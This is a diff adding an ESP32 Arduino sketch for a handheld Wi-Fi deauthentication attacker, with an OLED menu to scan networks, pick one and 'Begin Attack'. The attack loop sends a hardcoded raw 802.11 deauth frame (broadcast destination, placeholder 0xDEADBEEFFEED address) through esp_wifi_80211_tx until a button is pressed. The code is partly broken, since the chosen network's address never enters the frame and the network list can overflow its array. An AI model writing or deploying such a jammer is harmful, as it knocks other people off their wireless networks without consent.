@@ -1,0 +1,171 @@
+#include <WiFi.h>
+#include <Adafruit_GFX.h>
+#include <Adafruit_SSD1306.h>
+#include "esp_wifi.h"
+#include "image_list.h"  // Ensure this header file contains the deauth image data
+
+#define SCREEN_WIDTH 128
+#define SCREEN_HEIGHT 64
+
+// GPIO pins
+#define SPEAKER_PIN 3
+#define BUTTON_RETURN 9
+#define BUTTON_ENTER 10
+#define BUTTON_DOWN 20
+#define BUTTON_UP 21
+#define OLED_SDA 6
+#define OLED_SCL 7
+
+Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);
+
+int selectedNetwork = 0;
+bool attackMode = false;
+uint8_t numNetworks = 0;
+String networks[20];  // Array to store detected networks
+
+const uint8_t deauth_packet[] = {
+  0xC0, 0x00, 0x3A, 0x01,
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+  0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED,
+  0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED,
+  0x00, 0x00
+};
+
+// Function declarations
+void scanNetworks();
+void displayNetworks();
+void displayAttackOptions();
+void beginAttack();
+
+void setup() {
+  pinMode(BUTTON_RETURN, INPUT_PULLUP);
+  pinMode(BUTTON_ENTER, INPUT_PULLUP);
+  pinMode(BUTTON_DOWN, INPUT_PULLUP);
+  pinMode(BUTTON_UP, INPUT_PULLUP);
+
+  Serial.begin(115200);
+
+  // Initialize the OLED display
+  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
+    Serial.println(F("SSD1306 allocation failed"));
+    for (;;);
+  }
+  display.clearDisplay();
+  display.drawBitmap(0, 0, deauthImage, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);  // Display the deauth image
+  display.display();
+  delay(2000);
+
+  WiFi.mode(WIFI_STA);
+  scanNetworks();
+}
+
+void loop() {
+  if (digitalRead(BUTTON_ENTER) == LOW) {
+    if (!attackMode) {
+      // Navigate through the network list
+      selectedNetwork = 0;
+      displayNetworks();
+      while (true) {
+        if (digitalRead(BUTTON_DOWN) == LOW) {
+          selectedNetwork = (selectedNetwork + 1) % numNetworks;
+          displayNetworks();
+          delay(200);  // Debounce delay
+        } else if (digitalRead(BUTTON_UP) == LOW) {
+          selectedNetwork = (selectedNetwork - 1 + numNetworks) % numNetworks;
+          displayNetworks();
+          delay(200);  // Debounce delay
+        } else if (digitalRead(BUTTON_ENTER) == LOW) {
+          displayAttackOptions();
+          break;
+        }
+      }
+    } else {
+      // Start the deauth attack
+      beginAttack();
+    }
+  }
+
+  if (digitalRead(BUTTON_RETURN) == LOW) {
+    if (attackMode) {
+      attackMode = false;
+      displayNetworks();
+    }
+  }
+}
+
+void scanNetworks() {
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(WHITE);
+  display.setCursor(0, 0);
+  display.println(F("Scanning..."));
+  display.display();
+
+  numNetworks = WiFi.scanNetworks();
+  for (int i = 0; i < numNetworks; i++) {
+    networks[i] = WiFi.SSID(i);
+  }
+}
+
+void displayNetworks() {
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(WHITE);
+
+  int start = max(0, selectedNetwork - 2);
+  for (int i = start; i < min(start + 5, (int)numNetworks); i++) {  // Cast numNetworks to int
+    if (i == selectedNetwork) {
+      display.setTextColor(BLACK, WHITE);  // Inverse color
+    } else {
+      display.setTextColor(WHITE);
+    }
+    display.setCursor(0, (i - start) * 10);
+    display.println(networks[i]);
+  }
+
+  display.display();
+}
+
+void displayAttackOptions() {
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(WHITE);
+  display.setCursor(0, 0);
+  display.println(F("1. Begin Attack"));
+  display.println(F("2. Return to Selection"));
+  display.display();
+
+  while (true) {
+    if (digitalRead(BUTTON_DOWN) == LOW || digitalRead(BUTTON_UP) == LOW) {
+      attackMode = !attackMode;
+      displayAttackOptions();
+      delay(200);  // Debounce delay
+    } else if (digitalRead(BUTTON_ENTER) == LOW) {
+      if (attackMode) {
+        beginAttack();
+      } else {
+        displayNetworks();
+      }
+      break;
+    }
+  }
+}
+
+void beginAttack() {
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(WHITE);
+  display.setCursor(0, 0);
+  display.println(F("Attacking..."));
+  display.display();
+
+  while (digitalRead(BUTTON_RETURN) == HIGH) {
+    esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false);
+    delay(10);  // Adjust delay if necessary
+  }
+
+  display.println(F("Attack stopped."));
+  display.display();
+  delay(1000);
+  displayNetworks();
+}
